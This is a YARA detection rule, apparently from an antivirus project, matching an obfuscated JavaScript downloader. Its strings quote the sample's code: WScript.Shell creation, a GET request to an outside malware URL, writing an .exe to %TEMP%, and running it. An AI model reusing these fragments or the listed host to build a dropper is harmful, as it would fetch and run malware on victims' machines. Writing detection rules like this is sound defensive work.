rule sig_20160401_b9ce80f2dc0839fd40fc02cf0d0f8a67 {
  meta:
    description = "datamaliciousorder - file 20160401_b9ce80f2dc0839fd40fc02cf0d0f8a67.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c59b5a1cc80fac781457e869d67ea2254892c3b819f4765c82da8ac84f2d64a3"

  strings:
    $s1  = "function YrUcp(KsmXp, RvYc){BhOg = BhOg * 1; return KsmXp - RvYc;};" fullword ascii
    $s2  = "var ImUw = function KztJz() {return WScript[SnQa](\"WScript\"+\".Shell\");}(), OpdMu = 11;" fullword ascii
    $s3  = "if (IpFm[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "IpFm[PvmFb](\"G\" + \"ET\", \"http://prawoiznaki.pl/k3usa\", false);" fullword ascii
    $s5  = "function OpeKyd() {return ImUw[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"yXfIHIH47L.ex\" + \"e\";};" fullword ascii
    $s6  = "function AviOg(){return YgmWm + \"\";};" fullword ascii
    $s7  = "function ZcwEh() {return ((OmHs == true) && (OmHs == WoaHg)) ? 1 : BhOg;};" fullword ascii
    $s8  = "OmHs = true; " fullword ascii
    $s9  = "var JptEs = new this[\"Date\"]();" fullword ascii
    $s10 = "function UrFav(VnsEk) {var OkUmv = (1, 2, 3, 4, 5, VnsEk); return OkUmv;};" fullword ascii
    $s11 = "function YgYs()" fullword ascii
    $s12 = "var IlIc = false;" fullword ascii
    $s13 = "function LuTf(YnVj){ImUw[\"R\"+\"un\"](YnVj, BhOg, BhOg);};" fullword ascii
    $s14 = "function TonVyl(){return SnQa;};" fullword ascii
    $s15 = "WoaHg = true; " fullword ascii
    $s16 = "function LdVrv(){return 23;};" fullword ascii
    $s17 = "var OmHs = false;" fullword ascii
    $s18 = "return YrUcp(JxKdm, CboKyx);" fullword ascii
    $s19 = "var WoaHg = false;" fullword ascii
    $s20 = "}while (YeMn);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}